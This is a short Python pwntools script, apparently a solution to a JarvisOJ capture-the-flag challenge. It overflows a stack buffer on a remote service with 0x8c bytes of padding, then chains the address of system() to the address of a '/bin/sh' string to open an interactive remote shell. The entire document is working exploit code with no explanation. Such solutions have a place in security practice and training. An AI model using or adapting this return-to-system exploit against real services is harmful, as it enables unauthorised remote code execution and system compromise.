#!/usr/bin/env python
# coding=utf-8
from pwn import*
s=remote('pwn2.jarvisoj.com',9878)

t='A'*0x8c
ad_sys=0x8048320
ad_bin=0x804a024

payload=t+p32(ad_sys)+'BBBB'+p32(ad_bin)

s.send(payload)
s.interactive()
